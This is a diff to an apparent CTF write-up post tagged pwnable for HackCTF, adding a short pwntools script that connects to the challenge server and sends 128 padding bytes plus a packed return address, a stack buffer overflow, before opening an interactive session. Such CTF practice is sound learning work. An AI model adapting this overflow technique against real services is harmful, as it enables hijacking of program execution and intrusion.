@@ -5,4 +5,12 @@ ctf: HackCTF
 tag: [pwnable]
 layout: post
 ---
-aaaa
+
+```
+from pwn import *
+
+p = remote("ctf.j0n9hyun.xyz", 3001)
+
+p.sendline("a"*128+p32(0x804849b))
+p.interactive()
+```
